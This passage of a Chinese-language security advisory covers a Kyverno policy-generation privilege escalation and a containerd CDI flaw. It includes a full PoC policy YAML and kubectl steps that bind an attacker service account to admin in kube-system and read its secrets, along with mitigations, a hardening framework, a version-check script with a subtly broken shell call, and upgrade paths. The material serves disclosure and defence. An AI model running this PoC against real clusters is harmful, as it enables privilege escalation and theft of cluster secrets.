+<span class="w">      </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;create&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;update&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;patch&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;delete&quot;</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<h3>2.6 完整 PoC（来自官方 GitHub Advisory）</h3>
+<p><strong>前置条件：</strong>
+- 命名空间 <code>tenant-ns</code> 存在
+- 攻击者在 <code>tenant-ns</code> 中拥有 <code>namespacedgeneratingpolicies.policies.kyverno.io</code> 的 <code>create</code> 权限</p>
+<p><strong>攻击架构图：</strong></p>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────┐
+│ 命名空间: tenant-ns (攻击者控制)                              │
+│                                                             │
+│  ┌─────────────────────────────────────────┐               │
+│  │ NamespacedGeneratingPolicy              │               │
+│  │  name: cross-ns-escalate                │               │
+│  │  namespace: tenant-ns                   │               │
+│  │  spec:                                  │               │
+│  │    matchConstraints:                    │               │
+│  │      resourceRules:                     │               │
+│  │      - resources: [&quot;configmaps&quot;]        │               │
+│  │        operations: [&quot;CREATE&quot;]           │               │
+│  │    generation:                          │               │
+│  │    - expression: |                      │               │
+│  │        generator.apply(&quot;kube-system&quot;, [ │ ◀── 跨命名空间！│
+│  │          {                              │               │
+│  │            kind: &quot;RoleBinding&quot;,         │               │
+│  │            metadata: {                  │               │
+│  │              name: &quot;tenant-escalation&quot;, │               │
+│  │              namespace: &quot;kube-system&quot;   │               │
+│  │            },                           │               │
+│  │            subjects: [{                 │               │
+│  │              name: &quot;attacker&quot;,          │               │
+│  │              namespace: &quot;tenant-ns&quot;     │               │
+│  │            }],                          │               │
+│  │            roleRef: {                   │               │
+│  │              name: &quot;admin&quot;              │ ◀── cluster   │
+│  │            }                            │     admin！    │
+│  │          }                              │               │
+│  │        ])                               │               │
+│  └─────────────────────┬───────────────────┘               │
+│                        │                                    │
+│          Step 1: 创建 ConfigMap 触发策略                     │
+│                        │                                    │
+└────────────────────────┼────────────────────────────────────┘
+                         │
+                         ▼
+┌─────────────────────────────────────────────────────────────┐
+│ Kyverno 后台控制器 (cluster-admin 权限)                      │
+│                                                             │
+│  接收策略触发事件                                             │
+│  执行 generator.apply(&quot;kube-system&quot;, [...])                 │
+│  ❌ 不校验 namespace 是否与策略命名空间匹配                    │
+│  ✅ 直接在 kube-system 中创建 RoleBinding                    │
+└────────────────────────┬────────────────────────────────────┘
+                         │
+                         ▼
+┌─────────────────────────────────────────────────────────────┐
+│ 命名空间: kube-system                                        │
+│                                                             │
+│  ┌─────────────────────────────────────────┐               │
+│  │ RoleBinding: tenant-escalation          │               │
+│  │  subjects:                               │               │
+│  │  - kind: ServiceAccount                  │               │
+│  │    name: attacker                        │               │
+│  │    namespace: tenant-ns                  │               │
+│  │  roleRef:                                │               │
+│  │    kind: ClusterRole                     │               │
+│  │    name: admin                           │ ◀── kube-     │
+│  └─────────────────────────────────────────┘     system     │
+│                                                  admin！     │
+└─────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<p><strong>恶意策略 YAML：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">policies.kyverno.io/v1beta1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">NamespacedGeneratingPolicy</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cross-ns-escalate</span>
+<span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">tenant-ns</span><span class="w">        </span><span class="c1"># 策略在 tenant-ns 命名空间</span>
+<span class="nt">spec</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">matchConstraints</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">resourceRules</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">      </span><span class="nt">apiVersions</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;v1&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">      </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;configmaps&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">      </span><span class="nt">operations</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;CREATE&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="nt">generation</span><span class="p">:</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">expression</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
+<span class="w">      </span><span class="no">generator.apply(&quot;kube-system&quot;, [     # ← 跨命名空间！</span>
+<span class="w">        </span><span class="no">{</span>
+<span class="w">          </span><span class="no">&quot;apiVersion&quot;: &quot;rbac.authorization.k8s.io/v1&quot;,</span>
+<span class="w">          </span><span class="no">&quot;kind&quot;: &quot;RoleBinding&quot;,</span>
+<span class="w">          </span><span class="no">&quot;metadata&quot;: {</span>
+<span class="w">            </span><span class="no">&quot;name&quot;: &quot;tenant-escalation&quot;,</span>
+<span class="w">            </span><span class="no">&quot;namespace&quot;: &quot;kube-system&quot;</span>
+<span class="w">          </span><span class="no">},</span>
+<span class="w">          </span><span class="no">&quot;subjects&quot;: [{</span>
+<span class="w">            </span><span class="no">&quot;kind&quot;: &quot;ServiceAccount&quot;,</span>
+<span class="w">            </span><span class="no">&quot;name&quot;: &quot;attacker&quot;,</span>
+<span class="w">            </span><span class="no">&quot;namespace&quot;: &quot;tenant-ns&quot;</span>
+<span class="w">          </span><span class="no">}],</span>
+<span class="w">          </span><span class="no">&quot;roleRef&quot;: {</span>
+<span class="w">            </span><span class="no">&quot;apiGroup&quot;: &quot;rbac.authorization.k8s.io&quot;,</span>
+<span class="w">            </span><span class="no">&quot;kind&quot;: &quot;ClusterRole&quot;,</span>
+<span class="w">            </span><span class="no">&quot;name&quot;: &quot;admin&quot;</span>
+<span class="w">          </span><span class="no">}</span>
+<span class="w">        </span><span class="no">}</span>
+<span class="w">      </span><span class="no">])</span>
+</code></pre></div>
+
+<p><strong>利用步骤：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Step 1: 创建攻击者 ServiceAccount</span>
+kubectl<span class="w"> </span>-n<span class="w"> </span>tenant-ns<span class="w"> </span>create<span class="w"> </span>serviceaccount<span class="w"> </span>attacker
+
+<span class="c1"># Step 2: 应用恶意策略</span>
+kubectl<span class="w"> </span>apply<span class="w"> </span>-f<span class="w"> </span>malicious-policy.yaml
+
+<span class="c1"># Step 3: 在 tenant-ns 中创建任意 ConfigMap 以触发策略</span>
+kubectl<span class="w"> </span>-n<span class="w"> </span>tenant-ns<span class="w"> </span>create<span class="w"> </span>configmap<span class="w"> </span>trigger<span class="w"> </span>--from-literal<span class="o">=</span><span class="nv">key</span><span class="o">=</span>value
+
+<span class="c1"># Step 4: 验证 kube-system 中的 RoleBinding 已创建</span>
+kubectl<span class="w"> </span>-n<span class="w"> </span>kube-system<span class="w"> </span>get<span class="w"> </span>rolebinding<span class="w"> </span>tenant-escalation
+
+<span class="c1"># Step 5: 攻击者现在拥有 kube-system 的 admin 权限</span>
+kubectl<span class="w"> </span>--as<span class="o">=</span>system:serviceaccount:tenant-ns:attacker<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-n<span class="w"> </span>kube-system<span class="w"> </span>get<span class="w"> </span>secrets
+</code></pre></div>
+
+<h3>2.7 影响范围</h3>
+<table>
+<thead>
+<tr>
+<th>影响维度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>权限提升路径</td>
+<td>命名空间级用户 → 任意命名空间 admin</td>
+</tr>
+<tr>
+<td>可创建的资源</td>
+<td>Roles、RoleBindings、ConfigMaps、NetworkPolicies、Ingresses</td>
+</tr>
+<tr>
+<td>目标命名空间</td>
+<td>任意（包括 <code>kube-system</code>、<code>kube-public</code>）</td>
+</tr>
+<tr>
+<td>可授予的权限</td>
+<td>任意 ClusterRole（包括 <code>cluster-admin</code>）</td>
+</tr>
+<tr>
+<td>野外利用</td>
+<td>未确认（但 PoC 已公开）</td>
+</tr>
+</tbody>
+</table>
+<h3>2.8 缓解措施</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># P0: 立即升级至 Kyverno v1.18.2</span>
+helm<span class="w"> </span>upgrade<span class="w"> </span>kyverno<span class="w"> </span>kyverno/kyverno<span class="w"> </span>--version<span class="w"> </span><span class="m">1</span>.18.2
+
+<span class="c1"># P1: 审查谁拥有 NamespacedGeneratingPolicy 创建权限</span>
+kubectl<span class="w"> </span>get<span class="w"> </span>namespacedgeneratingpolicies.policies.kyverno.io<span class="w"> </span>--all-namespaces
+kubectl<span class="w"> </span>auth<span class="w"> </span>can-i<span class="w"> </span>create<span class="w"> </span>namespacedgeneratingpolicies.policies.kyverno.io<span class="w"> </span>--as<span class="o">=</span>&lt;user&gt;<span class="w"> </span>-n<span class="w"> </span>&lt;ns&gt;
+
+<span class="c1"># P1: 撤销不必要的访问</span>
+kubectl<span class="w"> </span>delete<span class="w"> </span>clusterrolebinding<span class="w"> </span>&lt;binding&gt;<span class="w">  </span><span class="c1"># 移除不必要的 NGP 创建权限</span>
+
+<span class="c1"># P2: 审计已有的 NamespacedGeneratingPolicy</span>
+kubectl<span class="w"> </span>get<span class="w"> </span>namespacedgeneratingpolicies.policies.kyverno.io<span class="w"> </span>--all-namespaces<span class="w"> </span>-o<span class="w"> </span>yaml<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>grep<span class="w"> </span>-A5<span class="w"> </span><span class="s2">&quot;generator.apply&quot;</span>
+</code></pre></div>
+
+<hr />
+<h2>三、两个漏洞的攻击面对比</h2>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>CVE-2026-53492 (containerd)</th>
+<th>CVE-2026-54523 (Kyverno)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>攻击层级</td>
+<td>容器运行时隔离</td>
+<td>策略引擎权限模型</td>
+</tr>
+<tr>
+<td>前置权限</td>
+<td>Pod 创建权限</td>
+<td>NGP 创建权限</td>
+</tr>
+<tr>
+<td>利用复杂度</td>
+<td>中（需要 CRIU + CDI 环境）</td>
+<td>低（仅需 kubectl）</td>
+</tr>
+<tr>
+<td>PoC 可用性</td>
+<td>无公开 PoC</td>
+<td>官方 Advisory 含完整 PoC</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>设备访问/资源配额绕过</td>
+<td>任意命名空间 cluster-admin</td>
+</tr>
+<tr>
+<td>野外利用</td>
+<td>未确认</td>
+<td>未确认（PoC 已公开）</td>
+</tr>
+<tr>
+<td>修复难度</td>
+<td>升级 containerd + 移除 CDI 规范</td>
+<td>升级 Kyverno</td>
+</tr>
+<tr>
+<td>检测难度</td>
+<td>中（需审计 CRIU 活动）</td>
+<td>低（审计 NGP 创建）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>四、K8s 控制面安全加固框架</h2>
+<h3>4.1 纵深防御架构</h3>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────┐
+│                    K8s 控制面安全加固框架                     │
+├─────────────────────────────────────────────────────────────┤
+│                                                             │
+│  Layer 1: RBAC 最小权限                                     │
+│  ├── 移除不必要的 Pod checkpoint 权限                        │
+│  ├── 收紧 NamespacedGeneratingPolicy 创建权限                │
+│  └── 定期审计 ClusterRoleBinding                            │
+│                                                             │
+│  Layer 2: 准入控制                                          │
+│  ├── 校验准入 Webhook 拒绝带 CDI 注解的 Pod                  │
+│  ├── 校验 NGP 的 generator.apply namespace 参数              │
+│  └── 强制 Pod Security Standards (restricted)               │
+│                                                             │
+│  Layer 3: 运行时隔离                                        │
+│  ├── 禁用不必要的 CRIU checkpoint 功能                      │
+│  ├── 移除不使用的 CDI 规范                                   │
+│  └── 容器以非 root 运行 + seccomp 配置                      │
+│                                                             │
+│  Layer 4: 审计与检测                                        │
+│  ├── K8s 审计日志：监控 CRD 端点异常 CREATE/UPDATE           │
+│  ├── Auditd：监控 CRIU 进程活动                              │
+│  ├── SIGMA 规则：检测 CDI 注解走私                           │
+│  └── 行为分析：检测 NGP 创建后的异常资源生成                  │
+│                                                             │
+│  Layer 5: 补丁管理                                          │
+│  ├── containerd &gt;= 2.1.9 / 2.2.5 / 2.3.2                   │
+│  ├── Kyverno &gt;= v1.18.2                                     │
+│  └── 定期扫描集群组件版本                                    │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>4.2 集群安全扫描脚本</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;K8s 控制面安全扫描脚本&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">check_containerd_version</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;检查 containerd 版本是否受 CVE-2026-53492 影响&quot;&quot;&quot;</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="s2">&quot;kubectl&quot;</span><span class="p">,</span> <span class="s2">&quot;get&quot;</span><span class="p">,</span> <span class="s2">&quot;nodes&quot;</span><span class="p">,</span> <span class="s2">&quot;-o&quot;</span><span class="p">,</span> <span class="s2">&quot;jsonpath={.items[*].status.nodeInfo.containerRuntimeVersion}&quot;</span><span class="p">],</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+    <span class="n">versions</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+    <span class="n">vulnerable</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">versions</span><span class="p">:</span>
+        <span class="c1"># 解析 containerd://1.6.x 或 containerd://2.x.x 格式</span>
+        <span class="k">if</span> <span class="s2">&quot;containerd://&quot;</span> <span class="ow">in</span> <span class="n">v</span><span class="p">:</span>
+            <span class="n">ver</span> <span class="o">=</span> <span class="n">v</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;containerd://&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+            <span class="n">parts</span> <span class="o">=</span> <span class="n">ver</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="n">major</span><span class="p">,</span> <span class="n">minor</span><span class="p">,</span> <span class="n">patch</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+                <span class="c1"># 检查是否在受影响版本范围内</span>
+                <span class="k">if</span> <span class="n">major</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+                    <span class="k">if</span> <span class="n">minor</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">patch</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">:</span>
+                        <span class="n">vulnerable</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
+                    <span class="k">elif</span> <span class="n">minor</span> <span class="o">==</span> <span class="mi">2</span> <span class="ow">and</span> <span class="n">patch</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">:</span>
+                        <span class="n">vulnerable</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
+                    <span class="k">elif</span> <span class="n">minor</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">patch</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+                        <span class="n">vulnerable</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">vulnerable</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">check_kyverno_version</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;检查 Kyverno 版本是否受 CVE-2026-54523 影响&quot;&quot;&quot;</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="s2">&quot;kubectl&quot;</span><span class="p">,</span> <span class="s2">&quot;get&quot;</span><span class="p">,</span> <span class="s2">&quot;deployment&quot;</span><span class="p">,</span> <span class="s2">&quot;-n&quot;</span><span class="p">,</span> <span class="s2">&quot;kyverno&quot;</span><span class="p">,</span> <span class="s2">&quot;kyverno-admission-controller&quot;</span><span class="p">,</span>
+         <span class="s2">&quot;-o&quot;</span><span class="p">,</span> <span class="s2">&quot;jsonpath={.spec.template.spec.containers[0].image}&quot;</span><span class="p">],</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+    <span class="n">image</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="k">if</span> <span class="s2">&quot;kyverno&quot;</span> <span class="ow">in</span> <span class="n">image</span><span class="p">:</span>
+        <span class="c1"># 提取版本号</span>
+        <span class="n">parts</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
+            <span class="n">ver</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+            <span class="n">v_parts</span> <span class="o">=</span> <span class="n">ver</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">v_parts</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="n">major</span><span class="p">,</span> <span class="n">minor</span><span class="p">,</span> <span class="n">patch</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">v_parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">v_parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">v_parts</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+                <span class="k">if</span> <span class="n">major</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">minor</span> <span class="o">==</span> <span class="mi">18</span> <span class="ow">and</span> <span class="n">patch</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="n">ver</span>
+                <span class="k">elif</span> <span class="n">major</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">minor</span> <span class="o">&lt;</span> <span class="mi">18</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="n">ver</span>
+    <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="n">image</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">check_cdi_enabled</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;检查节点是否启用了 CDI&quot;&quot;&quot;</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="s2">&quot;kubectl&quot;</span><span class="p">,</span> <span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="s2">&quot;node/$(kubectl get nodes -o jsonpath=&#39;{.items[0].metadata.name}&#39;)&quot;</span><span class="p">,</span>
+         <span class="s2">&quot;--&quot;</span><span class="p">,</span> <span class="s2">&quot;ls&quot;</span><span class="p">,</span> <span class="s2">&quot;/etc/cdi/&quot;</span><span class="p">,</span> <span class="s2">&quot;/var/run/cdi/&quot;</span><span class="p">],</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">returncode</span> <span class="o">==</span> <span class="mi">0</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">check_ngp_permissions</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;检查哪些用户拥有 NamespacedGeneratingPolicy 创建权限&quot;&quot;&quot;</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="s2">&quot;kubectl&quot;</span><span class="p">,</span> <span class="s2">&quot;auth&quot;</span><span class="p">,</span> <span class="s2">&quot;can-i&quot;</span><span class="p">,</span> <span class="s2">&quot;--list&quot;</span><span class="p">,</span> <span class="s2">&quot;-A&quot;</span><span class="p">],</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+    <span class="n">ngp_users</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">):</span>
+        <span class="k">if</span> <span class="s2">&quot;namespacedgeneratingpolicies&quot;</span> <span class="ow">in</span> <span class="n">line</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
+            <span class="n">ngp_users</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">ngp_users</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;K8s 控制面安全扫描&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+
+    <span class="c1"># CVE-2026-53492 检查</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[1] CVE-2026-53492 (containerd CDI 注解走私)&quot;</span><span class="p">)</span>
+    <span class="n">vulnerable_ctd</span> <span class="o">=</span> <span class="n">check_containerd_version</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">vulnerable_ctd</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  ⚠️  受影响版本: </span><span class="si">{</span><span class="n">vulnerable_ctd</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;  建议: 升级至 containerd &gt;= 2.1.9 / 2.2.5 / 2.3.2&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;  ✅ containerd 版本不受影响或已修复&quot;</span><span class="p">)</span>
+
+    <span class="n">cdi_enabled</span> <span class="o">=</span> <span class="n">check_cdi_enabled</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">cdi_enabled</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;  ⚠️  节点启用了 CDI，建议评估是否必要&quot;</span><span class="p">)</span>
+
+    <span class="c1"># CVE-2026-54523 检查</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[2] CVE-2026-54523 (Kyverno 策略生成提权)&quot;</span><span class="p">)</span>
+    <span class="n">kyverno_vulnerable</span><span class="p">,</span> <span class="n">kyverno_ver</span> <span class="o">=</span> <span class="n">check_kyverno_version</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">kyverno_vulnerable</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  ⚠️  Kyverno 版本 </span><span class="si">{</span><span class="n">kyverno_ver</span><span class="si">}</span><span class="s2"> 受影响&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;  建议: 升级至 Kyverno &gt;= v1.18.2&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  ✅ Kyverno 版本 </span><span class="si">{</span><span class="n">kyverno_ver</span><span class="si">}</span><span class="s2"> 不受影响&quot;</span><span class="p">)</span>
+
+    <span class="n">ngp_users</span> <span class="o">=</span> <span class="n">check_ngp_permissions</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">ngp_users</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  ℹ️  拥有 NGP 创建权限的用户: </span><span class="si">{</span><span class="n">ngp_users</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;扫描完成&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<hr />
+<h2>五、版本对照与升级路径</h2>
+<h3>containerd 升级路径</h3>
+<table>
+<thead>
+<tr>
+<th>当前版本</th>
+<th>目标版本</th>
+<th>方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2.1.0 - 2.1.8</td>
+<td><strong>2.1.9</strong></td>
+<td><code>apt upgrade containerd</code> / <code>yum update containerd</code></td>
+</tr>
+<tr>
+<td>2.2.0 - 2.2.4</td>
+<td><strong>2.2.5</strong></td>
+<td>同上</td>
+</tr>
+<tr>
+<td>2.3.0 - 2.3.1</td>
+<td><strong>2.3.2</strong></td>
+<td>同上</td>
+</tr>
+<tr>
+<td>&lt; 2.1.0</td>
+<td>不受影响</td>
+<td>无需操作</td>
+</tr>
+</tbody>
+</table>
+<h3>Kyverno 升级路径</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Helm 升级</span>
+helm<span class="w"> </span>repo<span class="w"> </span>update
+helm<span class="w"> </span>upgrade<span class="w"> </span>kyverno<span class="w"> </span>kyverno/kyverno<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--namespace<span class="w"> </span>kyverno<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--version<span class="w"> </span><span class="m">1</span>.18.2<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--reuse-values
+
+<span class="c1"># 验证升级</span>
+kubectl<span class="w"> </span>-n<span class="w"> </span>kyverno<span class="w"> </span>get<span class="w"> </span>deployment<span class="w"> </span>kyverno-admission-controller<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span><span class="nv">jsonpath</span><span class="o">=</span><span class="s1">&#39;{.spec.template.spec.containers[0].image}&#39;</span>
+
+<span class="c1"># 重启所有 Kyverno 组件</span>
+kubectl<span class="w"> </span>-n<span class="w"> </span>kyverno<span class="w"> </span>rollout<span class="w"> </span>restart<span class="w"> </span>deployment
+</code></pre></div>
+
+<hr />
+<h2>免责声明</h2>
